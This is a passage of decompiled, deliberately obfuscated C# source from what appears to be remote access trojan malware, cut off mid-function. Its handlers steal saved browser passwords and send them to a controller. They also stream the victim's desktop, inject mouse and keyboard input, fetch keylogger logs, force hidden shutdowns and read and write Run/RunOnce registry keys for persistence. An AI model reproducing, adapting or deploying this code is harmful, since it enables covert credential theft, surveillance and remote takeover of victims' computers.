      \u1064\u249C왐瞃閯溼\u2FE4\uF4E1\u32F1䙲莘\u2AB6\uFFFD\uFFFD\uE99Eﱋ塙Я\uF3C9\uFFFD = command
    }.ﯨ䧒앒\uF192帏\uEA57\uFFFD\uE435ₖተ撔\uFFFD帽뉠\u27F3\uE380\u3380暧冐\uF0C3)).Start();
    new SetStatus("Showed Messagebox").Execute(client);
  }

  public static void 鎨ᒝ䑂꿶\uF379闌邌\u2F19寷\u294A냆珞퓭裆뼪ᝂ\uEAB1\uE97B耳\uFFFD(
    GetPasswords packet,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    List<䄡ᮋ\uFFFD䆯ﺤ埵걝\uA83D횥풗慮\uFFFD\uFB12玠穓薐鵿餟ᝥ챯> 䄡ᮋ䆯ﺤ埵걝횥풗慮玠穓薐鵿餟ᝥ챯List = new List<䄡ᮋ\uFFFD䆯ﺤ埵걝\uA83D횥풗慮\uFFFD\uFB12玠穓薐鵿餟ᝥ챯>();
    List<string> data = new List<string>();
    for (int index = 0; index < 䄡ᮋ䆯ﺤ埵걝횥풗慮玠穓薐鵿餟ᝥ챯List.Count; ++index)
    {
      䄡ᮋ\uFFFD䆯ﺤ埵걝\uA83D횥풗慮\uFFFD\uFB12玠穓薐鵿餟ᝥ챯 䄡ᮋ䆯ﺤ埵걝횥풗慮玠穓薐鵿餟ᝥ챯 = 䄡ᮋ䆯ﺤ埵걝횥풗慮玠穓薐鵿餟ᝥ챯List[index];
      string str = string.Format(䄡ᮋ䆯ﺤ埵걝횥풗慮玠穓薐鵿餟ᝥ챯.Username + "$E$" + 䄡ᮋ䆯ﺤ埵걝횥풗慮玠穓薐鵿餟ᝥ챯.Password + "$E$" + 䄡ᮋ䆯ﺤ埵걝횥풗慮玠穓薐鵿餟ᝥ챯.URL + "$E$" + 䄡ᮋ䆯ﺤ埵걝횥풗慮玠穓薐鵿餟ᝥ챯.Application);
      data.Add(str);
    }
    new GetPasswordsResponse(data).Execute(client);
  }

  public static void 綥ീ櫧ꅆզ遖䞜얳ﱼ辩瓶淠\uED38疠힞ᷯ\uE0B8顀\u3305\u10CB(
    GetDesktop command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    string resolution = \uF178\uFFFD䬵컫퓌ꦽ沬\u0BA2됉\uAB0F䛲葈발㮷輦漱殲\u21AC\uE705䤻.\u2830줒嫈舩\uD8B9\uDF56驅\uFFFD촍굩飬\u29B2툍东蜊\uFFFDങ羨쬮蠀(ᅮ飪\u2959導䎔ꈣﴇ䣪൩宴擜駣Ṱ\uFFFD賅띜ቾ\u2B15뙑曼.\uF839\uEE40\uFFFD\uFFFD\uA4CEﳭ큂\uED76䦪\uEE75\uE0A1預\uF729ေ韮絉癬ñ\uE433逢(command.Monitor));
    if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4 == null)
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4 = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
    if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4.ImageQuality != command.Quality || \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4.Monitor != command.Monitor || \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4.Resolution != resolution)
    {
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4?.Dispose();
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4 = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
    }
    BitmapData bitmapdata = (BitmapData) null;
    Bitmap bitmap = (Bitmap) null;
    try
    {
      bitmap = ᅮ飪\u2959導䎔ꈣﴇ䣪൩宴擜駣Ṱ\uFFFD賅띜ቾ\u2B15뙑曼.ṁ꾅봄ିⲊ礼떬鹎폠糷딸韮쉺\u1B68聖旈渽廈\uE192᱆(command.Monitor);
      bitmapdata = bitmap.LockBits(new Rectangle(0, 0, bitmap.Width, bitmap.Height), ImageLockMode.ReadWrite, bitmap.PixelFormat);
      using (MemoryStream outStream = new MemoryStream())
      {
        if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4 == null)
          throw new Exception("StreamCodec can not be null.");
        \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4.CodeImage(bitmapdata.Scan0, new Rectangle(0, 0, bitmap.Width, bitmap.Height), new Size(bitmap.Width, bitmap.Height), bitmap.PixelFormat, (Stream) outStream);
        new GetDesktopResponse(outStream.ToArray(), \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4.ImageQuality, \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4.Monitor, \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4.Resolution).Execute(client);
      }
    }
    catch (Exception ex)
    {
      if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4 != null)
        new GetDesktopResponse((byte[]) null, \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4.ImageQuality, \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4.Monitor, \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4.Resolution).Execute(client);
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4 = (UnsafeStreamCodec) null;
    }
    finally
    {
      if (bitmap != null)
      {
        if (bitmapdata != null)
        {
          try
          {
            bitmap.UnlockBits(bitmapdata);
          }
          catch
          {
          }
        }
        bitmap.Dispose();
      }
    }
  }

  public static void ᮝ瓣\u2FB0\u3337\u2750聿賮濿닷\u2769펠雨ᇞﭗ뤱ꏛ\uF0C2줩溪Ỹ(
    DoMouseEvent command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    try
    {
      Screen[] allScreens = Screen.AllScreens;
      int x = allScreens[command.MonitorIndex].Bounds.X;
      int y = allScreens[command.MonitorIndex].Bounds.Y;
      Point p = new Point(command.X + x, command.Y + y);
      switch (command.Action)
      {
        case 넮覡\uED17\uF09F\uED81\uE043\u2972竞\uF839䢩삛뵿漇낉ﭲ\uFFFD喤ㅿ㦈㿰.讯絓罝巚ྩᝏ拏䭤坕糣ꧠ㶝\u2AB4䦨䧯ḣ\u1BF8鈤\u301D氄:
        case 넮覡\uED17\uF09F\uED81\uE043\u2972竞\uF839䢩삛뵿漇낉ﭲ\uFFFD喤ㅿ㦈㿰.뮿\uF82C劎䏤峘䂴ﲜ甫ᢅ\u0019ꚗ僉婟ꗊ\uE322忬\uFFFDẇ๋惀:
        case 넮覡\uED17\uF09F\uED81\uE043\u2972竞\uF839䢩삛뵿漇낉ﭲ\uFFFD喤ㅿ㦈㿰.\uEDF5\u181Aᾭﳄ瑫\uEEE4㣛轘볎ꓵ㱮ୀ뭵ꆍ\uF7AD䶠ྐྵ䰧㷽欷:
        case 넮覡\uED17\uF09F\uED81\uE043\u2972竞\uF839䢩삛뵿漇낉ﭲ\uFFFD喤ㅿ㦈㿰.\u227B힉\uEAC8껨\uE6DDꖉ\u1C9C\u2719\uFFFD\uA4B7釠븀촫땡ꮇ\uEC08\u1FCF侂ᇎȡ:
        case 넮覡\uED17\uF09F\uED81\uE043\u2972竞\uF839䢩삛뵿漇낉ﭲ\uFFFD喤ㅿ㦈㿰.ස䜕떔嫣\u329Bﶍ㕳昛ꪡ\uE3AC\u22E6됀㽼\uEEB0集\u2680ꔮ锺䦷ᨌ:
          if (䯍惓얄堟ꡌꖅ㾏㼺潶딒\uE84F㤪ሬ絶凧\u12C7蚀ɦ\uE4CFਦ.珌逘Ṗ댡ၳꉀ茼徔菲劾\uFAE7謀\uFFFD鸘\uE6D2\uEB2E\u204F넋\uE651\uEC4E())
          {
            䯍惓얄堟ꡌꖅ㾏㼺潶딒\uE84F㤪ሬ絶凧\u12C7蚀ɦ\uE4CFਦ.ǀ卑跒炙뚷섰旁\uF26B諽닪뺧藕ꔵ⳰\uFFFDオ옔\uEFEC疤幵();
            break;
          }
          break;
      }
      switch (command.Action)
      {
        case 넮覡\uED17\uF09F\uED81\uE043\u2972竞\uF839䢩삛뵿漇낉ﭲ\uFFFD喤ㅿ㦈㿰.讯絓罝巚ྩᝏ拏䭤坕糣ꧠ㶝\u2AB4䦨䧯ḣ\u1BF8鈤\u301D氄:
        case 넮覡\uED17\uF09F\uED81\uE043\u2972竞\uF839䢩삛뵿漇낉ﭲ\uFFFD喤ㅿ㦈㿰.뮿\uF82C劎䏤峘䂴ﲜ甫ᢅ\u0019ꚗ僉婟ꗊ\uE322忬\uFFFDẇ๋惀:
          䯍惓얄堟ꡌꖅ㾏㼺潶딒\uE84F㤪ሬ絶凧\u12C7蚀ɦ\uE4CFਦ.㗼\u2A2F曳ᙘ嫞\uFFFD腡\u2FDB\u0DCE\u0B84乴㳄䲠\uEEA2ҏ瘋傰\uFFFD찠ᶵ(p, command.IsMouseDown);
          break;
        case 넮覡\uED17\uF09F\uED81\uE043\u2972竞\uF839䢩삛뵿漇낉ﭲ\uFFFD喤ㅿ㦈㿰.\uEDF5\u181Aᾭﳄ瑫\uEEE4㣛轘볎ꓵ㱮ୀ뭵ꆍ\uF7AD䶠ྐྵ䰧㷽欷:
        case 넮覡\uED17\uF09F\uED81\uE043\u2972竞\uF839䢩삛뵿漇낉ﭲ\uFFFD喤ㅿ㦈㿰.\u227B힉\uEAC8껨\uE6DDꖉ\u1C9C\u2719\uFFFD\uA4B7釠븀촫땡ꮇ\uEC08\u1FCF侂ᇎȡ:
          䯍惓얄堟ꡌꖅ㾏㼺潶딒\uE84F㤪ሬ絶凧\u12C7蚀ɦ\uE4CFਦ.庭\uED60壱\uE938\uEA2D㟤壙콏ｊ憩ꪬ坪氠戍瓴ꠑఖ\uAA38\u2510\uE30C(p, command.IsMouseDown);
          break;
        case 넮覡\uED17\uF09F\uED81\uE043\u2972竞\uF839䢩삛뵿漇낉ﭲ\uFFFD喤ㅿ㦈㿰.ස䜕떔嫣\u329Bﶍ㕳昛ꪡ\uE3AC\u22E6됀㽼\uEEB0集\u2680ꔮ锺䦷ᨌ:
          䯍惓얄堟ꡌꖅ㾏㼺潶딒\uE84F㤪ሬ絶凧\u12C7蚀ɦ\uE4CFਦ.ː卧넨呬ύ䯹㜚絷깹㻻洸ꫜ\uFFFD鄃쌔\u3312煴\u1ADA憭羛(p);
          break;
        case 넮覡\uED17\uF09F\uED81\uE043\u2972竞\uF839䢩삛뵿漇낉ﭲ\uFFFD喤ㅿ㦈㿰.\u28E0悝윝\uF59B\uE26B騙\u0F16㑄띃䝹\uF5D5鉳\uE8D3醾礜\uE458ڠ쌳\uEDD0\u17FF:
          䯍惓얄堟ꡌꖅ㾏㼺潶딒\uE84F㤪ሬ絶凧\u12C7蚀ɦ\uE4CFਦ.푇\u19EA\uFFFD哈\uEB9A穬誜Ճ宎串ˍ淕俋\uFFFDǗ濛敁쏀덡喧(p, false);
          break;
        case 넮覡\uED17\uF09F\uED81\uE043\u2972竞\uF839䢩삛뵿漇낉ﭲ\uFFFD喤ㅿ㦈㿰.䤧빙뽘ㅛ\uE333\uFFFD݂굹箂দ瓏\uF42B\u2780휝ꀗ굁㰵쮞\uED2C\u2F1E:
          䯍惓얄堟ꡌꖅ㾏㼺潶딒\uE84F㤪ሬ絶凧\u12C7蚀ɦ\uE4CFਦ.푇\u19EA\uFFFD哈\uEB9A穬誜Ճ宎串ˍ淕俋\uFFFDǗ濛敁쏀덡喧(p, true);
          break;
      }
    }
    catch
    {
    }
  }

  public static void 两\uECC1\uF469앗瑞樺\uEFBEꨉᣗ䤁렓힔ᎊ\uF199䝪㞈驪삂뎰\u02F9(
    DoKeyboardEvent command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    if (䯍惓얄堟ꡌꖅ㾏㼺潶딒\uE84F㤪ሬ絶凧\u12C7蚀ɦ\uE4CFਦ.珌逘Ṗ댡ၳꉀ茼徔菲劾\uFAE7謀\uFFFD鸘\uE6D2\uEB2E\u204F넋\uE651\uEC4E())
      䯍惓얄堟ꡌꖅ㾏㼺潶딒\uE84F㤪ሬ絶凧\u12C7蚀ɦ\uE4CFਦ.ǀ卑跒炙뚷섰旁\uF26B諽닪뺧藕ꔵ⳰\uFFFDオ옔\uEFEC疤幵();
    䯍惓얄堟ꡌꖅ㾏㼺潶딒\uE84F㤪ሬ絶凧\u12C7蚀ɦ\uE4CFਦ.\u0E4Bꦑᇊ拪\u20AEẕ\uF3BD\u33B8\uE477곟뻻᤺\u2B25㧥\uF287藲弇ꩿ쾿ᙶ(command.Key, command.KeyDown);
  }

  public static void 扷\uE2ED\uED17\uF445熕囈\u3268쏉酁\uA82C鷻峔脊끟딼\uF763핽喿즈\uED92(
    GetMonitors command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    if (Screen.AllScreens.Length == 0)
      return;
    new GetMonitorsResponse(Screen.AllScreens.Length).Execute(client);
  }

  public static void \uE047祤騔鲵\u09DA㤀歆꽴褤瘩樽廉渉깈\uFFFD\u06D4筧\uF172䤟\uF086(
    GetKeyloggerLogs command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ﳝ崟壐幦앍㪉\uEFDD吣䓛\u2BA0堃ꨡ엠웿䀩춙麞搿Ⰴᔒ()
    {
      \u2567\uFFFD嬆㦡葲\uE1B8\u3343\uD7C9\u2BE4舎\u0BF0胑\uEA83㩆衼䂀\uEE60잧\uF679께 = client
    }.簧\uE03B踟꧀এ쥷웏誈\uF730짠딕䧇菟\u2D97ᅰ袀쾪መ\u2895騵)).Start();
  }

  public static string PassDirectory => Path.Combine(Path.GetTempPath(), "Chrome\\Directory\\Browsers\\");

  public static void 珮\u3104鎈锆ᔬ냗킜\u22D9刾럂㢌에溵ꅎ\u263F\uE459\u0882㚊ꬁ\u09F3(
    GetAllPasswords command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\u1812稣醢ಔ\u1CC8싖㧔䝫㺹㙓ሗ逯郓ꚭե靓ꙙ擭꼊\uE408()
    {
      놰Ҡ\uE8B6酝ϲ綰囧㥶\uD921\uDED2﨣プ醀\uFFFD\uF8EA磻କ咬\u1AA8ࣼ = client
    }.\uFFFDงꂭ\u22A0䁘炐\uF7E8窎얾\u0FDF硣睅\uAAFB껭儗\uA7F5\uA4C4憇\uA6F4聾)).Start();
  }

  public static void 盐\uF7C9疱\uE835籦ꌆ騺쌨劯䌅륕놾怖ꕅ볁킏\uFFFD픝ᅒ瞭(
    GetDrives command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    DriveInfo[] array;
    try
    {
      array = ((IEnumerable<DriveInfo>) DriveInfo.GetDrives()).Where<DriveInfo>((Func<DriveInfo, bool>) (d => d.IsReady)).ToArray<DriveInfo>();
    }
    catch (IOException ex)
    {
      new SetStatusFileManager("GetDrives I/O error", false).Execute(client);
      return;
    }
    catch (UnauthorizedAccessException ex)
    {
      new SetStatusFileManager("GetDrives No permission", false).Execute(client);
      return;
    }
    if (array.Length == 0)
    {
      new SetStatusFileManager("GetDrives No drives", false).Execute(client);
    }
    else
    {
      string[] driveDisplayName = new string[array.Length];
      string[] rootDirectory = new string[array.Length];
      for (int index = 0; index < array.Length; ++index)
      {
        string str = (string) null;
        try
        {
          str = array[index].VolumeLabel;
        }
        catch
        {
        }
        if (string.IsNullOrEmpty(str))
          driveDisplayName[index] = string.Format("{0} [{1}, {2}]", (object) array[index].RootDirectory.FullName, (object) \uF178\uFFFD䬵컫퓌ꦽ沬\u0BA2됉\uAB0F䛲葈발㮷輦漱殲\u21AC\uE705䤻.锆ꉢ䀨㻔\u2F29ꥯ\uF310芻᩻זၥ芋딜鼖揿퇰\u1CFE\uFFFD撐띜(array[index].DriveType), (object) array[index].DriveFormat);
        else
          driveDisplayName[index] = string.Format("{0} ({1}) [{2}, {3}]", (object) array[index].RootDirectory.FullName, (object) str, (object) \uF178\uFFFD䬵컫퓌ꦽ沬\u0BA2됉\uAB0F䛲葈발㮷輦漱殲\u21AC\uE705䤻.锆ꉢ䀨㻔\u2F29ꥯ\uF310芻᩻זၥ芋딜鼖揿퇰\u1CFE\uFFFD撐띜(array[index].DriveType), (object) array[index].DriveFormat);
        rootDirectory[index] = array[index].RootDirectory.FullName;
      }
      new GetDrivesResponse(driveDisplayName, rootDirectory).Execute(client);
    }
  }

  public static void 빑蠵\uEBFBɟጙ㺺წ彩Ҷ읪ᢨ\uFFFD砞㤏緗\u1C93\u3314\u2B9Cᘺ䁬(
    DoShutdownAction command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    try
    {
      ProcessStartInfo startInfo = new ProcessStartInfo();
      switch (command.Action)
      {
        case 瞕ꯨ뼃濄톍掳\u09D8柬븱ꗨ哐\uEEDA紥ո샡җ멨季\uE8FB齂.䬜쬳更袆劙\uFFF1輰尮초\uA702䆡퀃푊쒘輅呥ᅞﺠ\uE24D姍:
          startInfo.WindowStyle = ProcessWindowStyle.Hidden;
          startInfo.UseShellExecute = true;
          startInfo.Arguments = "/s /t 0";
          startInfo.FileName = "shutdown";
          Process.Start(startInfo);
          break;
        case 瞕ꯨ뼃濄톍掳\u09D8柬븱ꗨ哐\uEEDA紥ո샡җ멨季\uE8FB齂.ﻕ儫\u083D䴪埪烂\u2E8B\uFFFD㟷\uF44B瓕캞i䳾Ⲃ푖澖ᶮ盿\uF0FA:
          startInfo.WindowStyle = ProcessWindowStyle.Hidden;
          startInfo.UseShellExecute = true;
          startInfo.Arguments = "/r /t 0";
          startInfo.FileName = "shutdown";
          Process.Start(startInfo);
          break;
        case 瞕ꯨ뼃濄톍掳\u09D8柬븱ꗨ哐\uEEDA紥ո샡җ멨季\uE8FB齂.\u2F2Aу殦劗蜁栛\uFFFD餯ⵚ䦠솶稤\uF6CA狘㯤\u9FE7㼓ᘼ䩞ꡭ:
          Application.SetSuspendState(PowerState.Suspend, true, true);
          break;
      }
    }
    catch (Exception ex)
    {
      new SetStatus(string.Format("Action failed: {0}", (object) ex.Message)).Execute(client);
    }
  }

  public static void \u0593癌ﲅ\uF0AF\uA956뗍횘\u236A\uE653죙ଘ䈿짘\uF055价\u2E29ᇨ걏ꢧ補(
    GetStartupItems command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    try
    {
      List<string> startupitems = new List<string>();
      using (RegistryKey key = \u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.㟃ɏ\uF7A0䑐渖靦뎦믄죡ቜ㓽\uA7BF뽙舏幨踖쎹\u4DFE袖㺐(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
      {
        if (key != null)
          startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "0" + formattedKeyValue)));
      }
      using (RegistryKey key = \u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.㟃ɏ\uF7A0䑐渖靦뎦믄죡ቜ㓽\uA7BF뽙舏幨踖쎹\u4DFE袖㺐(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
      {
        if (key != null)
          startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "1" + formattedKeyValue)));
      }
      using (RegistryKey key = \u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.㟃ɏ\uF7A0䑐渖靦뎦믄죡ቜ㓽\uA7BF뽙舏幨踖쎹\u4DFE袖㺐(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
      {
        if (key != null)
          startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "2" + formattedKeyValue)));
      }
      using (RegistryKey key = \u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.㟃ɏ\uF7A0䑐渖靦뎦믄죡ቜ㓽\uA7BF뽙舏幨踖쎹\u4DFE袖㺐(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
      {
        if (key != null)
          startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "3" + formattedKeyValue)));
      }
      if (ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Is64Bit)
      {
        using (RegistryKey key = \u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.㟃ɏ\uF7A0䑐渖靦뎦믄죡ቜ㓽\uA7BF뽙舏幨踖쎹\u4DFE袖㺐(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
        {
          if (key != null)
            startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "4" + formattedKeyValue)));
        }
        using (RegistryKey key = \u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.㟃ɏ\uF7A0䑐渖靦뎦믄죡ቜ㓽\uA7BF뽙舏幨踖쎹\u4DFE袖㺐(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
        {
          if (key != null)
            startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "5" + formattedKeyValue)));
        }
      }
      if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
      {
        FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
        startupitems.AddRange(((IEnumerable<FileInfo>) files).Where<FileInfo>((Func<FileInfo, bool>) (file => file.Name != "desktop.ini")).Select<FileInfo, string>((Func<FileInfo, string>) (file => string.Format("{0}||{1}", (object) file.Name, (object) file.FullName))).Select<string, string>((Func<string, string>) (formattedKeyValue => "6" + formattedKeyValue)));
      }
      new GetStartupItemsResponse(startupitems).Execute(client);
    }
    catch (Exception ex)
    {
      new SetStatus(string.Format("Getting Autostart Items failed: {0}", (object) ex.Message)).Execute(client);
    }
  }

  public static void 뮢灆滪鴿鎰ᖸ쿩\u242B\u280E昱侵퍁飠\uF1C3컻堔偬箝\u2961턶(
    DoStartupItemAdd command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    try
    {
      switch (command.Type)
      {
        case 0:
          if (\u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.\uEE5CԱ\uE1C7᪅㜲뙔㭗嘋聆ሟ㾄嘱쎖ǃㄨᾥꮟ骤ᚸ奊(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 1:
          if (\u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.\uEE5CԱ\uE1C7᪅㜲뙔㭗嘋聆ሟ㾄嘱쎖ǃㄨᾥꮟ骤ᚸ奊(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 2:
          if (\u2125举\u003Cȋ푡흇钹봳\uF05B\uE37A聉髦踾ל\uF471\uFFFDꂊ\u255D\uA63E됈.\uEE5CԱ\uE1C7᪅㜲뙔㭗嘋聆ሟ㾄嘱쎖ǃㄨᾥꮟ骤ᚸ奊(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 3:
